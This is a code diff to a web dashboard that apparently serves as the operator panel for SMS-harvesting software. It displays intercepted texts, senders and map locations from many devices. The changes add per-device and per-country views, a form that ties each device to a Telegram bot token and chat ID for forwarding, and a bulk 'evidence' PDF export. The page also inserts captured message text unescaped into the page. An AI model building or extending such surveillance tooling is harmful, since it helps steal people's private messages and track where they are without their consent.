@@ -32,29 +32,130 @@
             </div>
         </div>
 
-        <table>
-            <thead>
-                <tr>
-                    <th>Device</th>
-                    <th>Sender</th>
-                    <th>Message</th>
-                    <th>Time</th>
-                    <th>Location</th> </tr>
-            </thead>
-            <tbody id="log-table-body"></tbody>
-        </table>
-        <div id="no-data-msg" class="no-data" style="display: none;">No SMS logs found yet...</div>
+        <div class="main" style="display:flex; gap:20px; align-items:flex-start;">
+            <aside class="sidebar" style="width: 300px; padding: 15px; background: rgba(255,255,255,0.02); border-radius: 8px;">
+                <h3 style="margin-top:0; color:#00ff41;">Devices & Users</h3>
+                <div style="margin-bottom:8px; display:flex; gap:8px;">
+                    <button class="btn-clear" onclick="fetchUsers()">Refresh</button>
+                    <button class="btn-clear" onclick="selectDevice(null)" style="background:#0066ff">All Devices</button>
+                </div>
+
+                <div id="users-list" style="max-height:160px; overflow:auto; margin-bottom:12px;">
+                    <!-- Populated dynamically -->
+                </div>
+
+                <h4 style="color:#8be9fd; margin-top:6px;">Countries</h4>
+                <div style="display:flex; gap:8px; margin-bottom:8px;">
+                  <button class="btn-clear" onclick="fetchCountries()" style="background:#00bcd4">Refresh</button>
+                  <button class="btn-clear" onclick="selectCountry(null)" style="background:#444">All</button>
+                </div>
+                <div id="countries-list" style="max-height:120px; overflow:auto; color:#ddd; font-size:0.95em;">
+                  <div style="color:#888; padding:8px">No countries yet</div>
+                </div>
+
+                <hr style="border-color: rgba(255,255,255,0.04);">
+                <h4 style="color:#ffd079;">Add / Update User</h4>
+                <div style="display:flex; flex-direction:column; gap:8px;">
+                    <input id="u-deviceId" placeholder="Device ID" style="padding:8px; border-radius:4px; border:1px solid rgba(255,255,255,0.04); background:transparent; color:#fff;" />
+                    <input id="u-bot" placeholder="Telegram Bot Token" style="padding:8px; border-radius:4px; border:1px solid rgba(255,255,255,0.04); background:transparent; color:#fff;" />
+                    <input id="u-chat" placeholder="Telegram Chat ID" style="padding:8px; border-radius:4px; border:1px solid rgba(255,255,255,0.04); background:transparent; color:#fff;" />
+                    <div style="display:flex; gap:8px;">
+                        <button class="btn-clear" onclick="saveUser()">Save</button>
+                    </div>
+                </div>
+
+                <hr style="border-color: rgba(255,255,255,0.04);">
+                <div style="display:flex; gap:8px;">
+                    <button class="btn-clear" onclick="downloadEvidence()">Download Evidence</button>
+                    <button class="btn-clear" onclick="sendTest()" style="background:#ff0066">Send Test</button>
+                </div>
+            </aside>
+
+            <section class="main-table" style="flex:1;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Device</th>
+                            <th>Sender</th>
+                            <th>Message</th>
+                            <th>Time</th>
+                            <th>Location</th>
+                        </tr>
+                    </thead>
+                    <tbody id="log-table-body"></tbody>
+                </table>
+                <div id="no-data-msg" class="no-data" style="display: none;">No SMS logs found for this device...</div>
+            </section>
+        </div>
     </div>
 
     <script>
+        let selectedDeviceId = null;
+        let selectedCountry = null;
+        let usersCache = [];
+
+        async function fetchCountries() {
+            try {
+                const res = await fetch('/stats/countries');
+                const arr = await res.json();
+                const cContainer = document.getElementById('countries-list');
+                if (!arr || arr.length === 0) {
+                    cContainer.innerHTML = '<div style="color:#888; padding:8px">No countries yet</div>';
+                    return;
+                }
+                cContainer.innerHTML = arr.map(c => `<div style="padding:6px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(255,255,255,0.02);">
+                  <div style="min-width:0; overflow:hidden;"><strong style="color:#8be9fd">${c.country}</strong><div style="font-size:0.85em; color:#aaa">${c.code}</div></div>
+                  <div style="display:flex; gap:8px; align-items:center"><div style="color:#fff; background:#222; padding:4px 8px; border-radius:4px">${c.count}</div>
+                    <button class="btn-clear" onclick="selectCountry('${c.code}')" style="padding:6px 8px;">View</button>
+                  </div>
+                </div>`).join('');
+            } catch (err) {
+                console.error('Countries fetch error', err);
+            }
+        }
+
+        function prefillUser(deviceId, bot, chat) {
+            document.getElementById('u-deviceId').value = deviceId || '';
+            document.getElementById('u-bot').value = bot || '';
+            document.getElementById('u-chat').value = chat || '';
+        }
+
+        async function saveUser() {
+            const deviceId = document.getElementById('u-deviceId').value.trim();
+            const bot = document.getElementById('u-bot').value.trim();
+            const chat = document.getElementById('u-chat').value.trim();
+            if (!deviceId) return alert('deviceId is required');
+            try {
+                const res = await fetch('/users', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, telegramBotToken: bot || null, telegramChatId: chat || null }) });
+                const json = await res.json();
+                alert('Saved user: ' + json.deviceId);
+                fetchUsers();
+            } catch (err) { console.error('Save user error', err); alert('Failed to save user') }
+        }
+
+        function selectDevice(deviceId) {
+            selectedDeviceId = deviceId;
+            selectedCountry = null;
+            fetchLogs();
+        }
+
+        function selectCountry(code) {
+            selectedCountry = code;
+            selectedDeviceId = null;
+            fetchLogs();
+        }
+
         async function fetchLogs() {
             try {
-                const response = await fetch('/get-logs');
+                let query = '';
+                if (selectedDeviceId) query = `?deviceId=${encodeURIComponent(selectedDeviceId)}`;
+                else if (selectedCountry) query = `?country=${encodeURIComponent(selectedCountry)}`;
+                const response = await fetch('/get-logs' + query);
                 const logs = await response.json();
                 const tableBody = document.getElementById('log-table-body');
                 const noDataMsg = document.getElementById('no-data-msg');
 
-                if (logs.length === 0) {
+                if (!logs || logs.length === 0) {
                     tableBody.innerHTML = '';
                     noDataMsg.style.display = 'block';
                     return;
@@ -62,7 +163,6 @@
 
                 noDataMsg.style.display = 'none';
                 tableBody.innerHTML = logs.map(log => {
-                    // Location link logic
                     const locationHtml = (log.location && log.location !== "Disabled") 
                         ? `<a href="https://www.google.com/maps?q=${log.location}" target="_blank" class="map-link">📍 View Map</a>`
                         : `<span style="color: #666;">No Data</span>`;
@@ -73,18 +173,43 @@
                             <td>${log.sender}</td>
                             <td>${log.message}</td>
                             <td style="font-size: 0.85em; color: #aaa;">${log.time}</td>
-                            <td>${locationHtml}</td> 
+                            <td>${locationHtml}</td>
                         </tr>
                     `;
                 }).join('');
-                
-                document.getElementById('sync-status').innerText = 'Last Sync: ' + new Date().toLocaleTimeString();
+
+                document.getElementById('sync-status').innerText = selectedDeviceId ? `Device: ${selectedDeviceId} — Last Sync: ` + new Date().toLocaleTimeString() : 'Last Sync: ' + new Date().toLocaleTimeString();
                 document.getElementById('sync-status').style.background = '#28a745';
             } catch (error) {
                 console.error('Fetch Error:', error);
                 document.getElementById('sync-status').innerText = 'Sync Error!';
                 document.getElementById('sync-status').style.background = '#dc3545';
             }
+        }
+
+        async function downloadEvidence() {
+            if (!selectedDeviceId) return alert('Select a device first');
+            try {
+                const res = await fetch('/evidence', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId: selectedDeviceId, limit: 500 }) });
+                if (!res.ok) return alert('Failed to generate evidence');
+                const blob = await res.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `tiger_evidence_${selectedDeviceId}.pdf`;
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+                window.URL.revokeObjectURL(url);
+            } catch (err) { console.error('Evidence download error', err); alert('Failed to download evidence') }
+        }
+
+        async function sendTest() {
+            if (!selectedDeviceId) return alert('Select a device first');
+            try {
+                const res = await fetch(`/send-test/${encodeURIComponent(selectedDeviceId)}`, { method: 'POST' });
+                if (res.ok) alert('Test notification sent'); else alert('Failed to send test');
+            } catch (err) { console.error('Send test error', err); alert('Failed to send test') }
         }
 
         async function clearLogs() {
@@ -94,7 +219,9 @@
             }
         }
 
-        setInterval(fetchLogs, 5000);
+        // Initial load
+        fetchUsers();
+        setInterval(() => { fetchUsers(); fetchLogs(); }, 5000);
         fetchLogs();
     </script>
 </body>
